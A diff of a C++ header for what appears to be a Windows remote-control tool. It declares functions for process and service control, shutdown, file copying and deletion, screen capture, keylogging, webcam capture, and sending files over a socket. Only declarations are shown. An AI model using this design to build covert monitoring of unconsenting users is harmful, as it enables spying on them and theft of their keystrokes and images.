@@ -22,17 +22,19 @@ using namespace cv;
 
 #define PORT 8080
 #define BUFFER_SIZE 2048
+#define SHUTDOWN_DELAY 15
 
 extern VideoCapture* cap;
 extern HHOOK hHook;
 extern atomic<bool> keepKeyloggerRunning;
 extern ofstream f;
-extern wstringstream inp;
-extern wstringstream out;
+extern stringstream inp, out;
+extern string webcamCapturePath, keyloggerCapturePath, screenCapturePath;
 
-map<wstring, map<wstring, function<void()>>> setupHandlers();
+map<string, map<string, function<void()>>> setupHandlers();
+string getInstruction();
 void listProcesses();
-void startApp(wchar_t* appPath);
+void startApp(LPWSTR appPath);
 void stopApp(DWORD processID);
 void listServices();
 void startServiceByName(LPCWSTR serviceName);
@@ -41,11 +43,12 @@ void shutdownMachine();
 void restartMachine();
 void copyFile(LPCWSTR src, LPCWSTR dest);
 void deleteFile(LPCWSTR filePath);
-void captureScreen(wstring outputPath);
+void captureScreen();
 void startKeylogger();
 void stopKeylogger();
 void startCamera();
 void stopCamera();
+void sendFile(CSocket& socket, const string& filePath);
 bool enableShutdownPrivilege();
 
 #endif
